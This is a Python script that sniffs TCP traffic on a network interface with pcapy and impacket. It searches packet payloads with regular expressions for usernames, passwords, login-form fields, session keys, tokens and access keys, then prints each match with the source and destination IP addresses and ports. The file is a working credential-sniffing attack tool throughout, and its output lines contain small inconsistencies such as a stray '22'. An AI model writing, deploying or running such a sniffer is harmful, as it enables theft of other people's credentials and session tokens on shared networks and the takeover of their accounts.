#!/usr/bin/python
import sys
import re
import getopt
import pcapy
from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder
# Interface to sniff on
dev = "eth0"
# Pcap filter
filter = "tcp"
# Decoder for all layers
eth_dec = EthDecoder()
ip_dec = IPDecoder()
tcp_dec = TCPDecoder()

# This function will be called for every packet, decode it and
# try to find a username or password in it
class sniffer():
	def __init__(self):
		self.stop=''
		self.source_ip=''
		self.matched_packet=''
		self.source_ip=''
		self.source_port=''
		self.destination_ip=''
		self.destination_port =''
		self.error=False
	def handle_packet(self, hdr, data):
		if self.stop !='':#sentinel for stopping the sniffer
			self.matched_packet=''
			print ('stopped snifing')
			exit()
		# Patterns that match usernames and passwords
		pattern = re.compile(r"""(?P<found>(USERNAME|PASS|email|txtusername|
			txtPassword|loginform|loginForm:uname|txtUN|pwd|LoginForm\[username\]| LoginForm\[password\]|
			PASSWORD|BENUTZER|PASSWORT|AUTH|ACCESS|ACCESS_?KEY)[=:\s].+)\b""",re.MULTILINE|re.IGNORECASE)
		eth_pkt = eth_dec.decode(data)
		ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
		tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
		payload = ip_pkt.get_data_as_string()
		match = re.search(pattern, payload)
		#details of packet


		if match and match.groupdict()['found'] != None:
			if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and not tcp_pkt.get_FIN():
				self.source_ip=ip_pkt.get_ip_src()
				self.source_port=tcp_pkt.get_th_sport()
				self.destination_ip=ip_pkt.get_ip_dst()
				self.destination_port =tcp_pkt.get_th_dport()

				print ("%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),tcp_pkt.get_th_sport(),ip_pkt.get_ip_dst(),tcp_pkt.get_th_dport()) )
				print ("\t%s\n" % (match.groupdict()['found']) )
				self.matched_packet=match.groupdict()['found']
		else:
			pattern = re.compile(r"""(?P<found>(SESSION|SESSION_?KEY|TOKEN|AUTH|
				ACCESS|ACCESS_?KEY)[=:\s].+)\b""",re.MULTILINE|re.IGNORECASE)
			match = re.search(pattern, payload)
			if match and match.groupdict()['found'] != None:
				if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and not tcp_pkt.get_FIN() and match.groupdict()['found'] != None:
					self.source_ip=ip_pkt.get_ip_src()
					self.source_port=tcp_pkt.get_th_sport()
					self.destination_ip=ip_pkt.get_ip_dst()
					self.destination_port =tcp_pkt.get_th_dport()
					print ("%s:%d ->22 %s:%d" % (ip_pkt.get_ip_src(),tcp_pkt.get_th_sport(),ip_pkt.get_ip_dst(),tcp_pkt.get_th_dport()) )
					print ("\t 22 %s\n" % (match.groupdict()['found']) )
					self.matched_packet=match.groupdict()['found']
					

	def start_sniffing(self, *args):
		dev = args[0]
		filt='tcp'
		#target=args[2]
		print (str(dev) + "   =>  "+str(args[1]) )
		try :
			pcap = pcapy.open_live(dev, 1500, 0, 100)
			pcap.setfilter(filt)
			print ("Sniffing sensitive data on  " + str(dev) )
			pcap.loop(0, self.handle_packet)
		except  Exception as e:
			self.error=e
			print (e)
			exit()


